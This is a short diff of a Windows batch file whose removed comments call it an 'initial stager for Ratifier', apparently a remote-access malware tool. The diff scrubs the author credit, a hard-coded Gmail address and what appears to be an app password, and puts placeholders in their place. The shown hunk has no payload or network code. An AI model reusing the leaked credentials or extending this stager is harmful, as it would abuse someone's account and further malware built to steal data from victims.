@@ -1,10 +1,8 @@
 @echo off
-@REM initial stager for Ratifier
-@REM created by : gozen-fotoZ
 
 @REM credentials - CHANGE ME
-set "email=trassh.bucket@gmail.com"
-set "eword=xcsf bklk azgw mrub"
+set "email=example@gmail.com"
+set "key"
 
 @REM variables
 set "var=%cd%"
